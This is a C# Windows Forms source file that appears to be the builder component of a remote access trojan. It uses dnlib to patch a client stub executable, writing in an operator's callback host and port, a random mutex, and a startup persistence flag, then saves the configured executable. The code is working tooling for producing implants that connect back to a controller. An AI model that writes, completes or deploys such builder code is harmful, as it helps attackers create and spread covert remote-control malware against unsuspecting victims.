using dnlib.DotNet;
using dnlib.DotNet.Emit;
using PacketLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms.UtilsForm
{
    public partial class Builder_Form : Form
    {
        public Builder_Form()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            string stub = @"Stub\Client.exe";
            if (!File.Exists(stub)) { MessageBox.Show("Stub not found."); return; }
            button1.Enabled = false;
            SaveFileDialog saveFile = new SaveFileDialog();
            saveFile.Filter = "Executable (*.exe)|*.exe";
            if (saveFile.ShowDialog() == DialogResult.OK)
            {
                ModuleDef moduleDef = ModuleDefMD.Load(stub);
                await Task.Run(() =>
                {
                    foreach(var type in  moduleDef.Types)
                    {
                        foreach(var method in type.Methods)
                        {
                            if (!method.HasBody) continue;
                            
                            for(int i = 0; i < method.Body.Instructions.Count; i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].OpCode == null) return;

                                    switch(method.Body.Instructions[i].Operand)
                                    {
                                        case "[MUTEX]":
                                            {
                                                method.Body.Instructions[i].Operand = Helpers.Random();
                                                break;
                                            } 
                                        case "[HOST]":
                                            {
                                                method.Body.Instructions[i].Operand = textBox1.Text;
                                                break;
                                            } 
                                        case "[PORT]":
                                            {
                                                method.Body.Instructions[i].Operand = numericUpDown1.Value.ToString();
                                                break;
                                            }
                                        case "[APPSTARTUP]":
                                            {
                                                method.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
                                                break;
                                            }
                                    }
                                }
                            }
                        
                        }
                    }
                });
                moduleDef.Write(saveFile.FileName);
                moduleDef.Dispose();
                MessageBox.Show("Done.");
                this.Close();
            }
            button1.Enabled = true;
            button1.Focus();
        }
    }
}
